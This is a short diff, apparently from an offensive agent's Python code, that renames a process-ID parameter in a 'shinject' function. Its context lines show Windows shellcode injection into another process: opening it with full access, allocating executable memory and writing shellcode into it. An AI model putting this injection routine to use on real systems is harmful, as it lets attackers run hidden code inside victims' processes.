@@ -1,4 +1,4 @@
-    def shinject(self, task_id, shellcode, pid):
+    def shinject(self, task_id, shellcode, process_id):
         from ctypes import windll,c_int,byref,c_ulong
         total_chunks = 1
         chunk_num = 0
@@ -22,10 +22,10 @@
 
         kernel32 = windll.kernel32
         code_size = len(sc)
-        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
+        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(process_id))
 
         if not h_process:
-            return "[!] Error: Couldn't acquire a handle to PID {}".format(pid)
+            return "[!] Error: Couldn't acquire a handle to PID {}".format(process_id)
         arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
         kernel32.WriteProcessMemory(h_process, arg_address, sc, code_size, 0)
         thread_id = c_ulong(0)
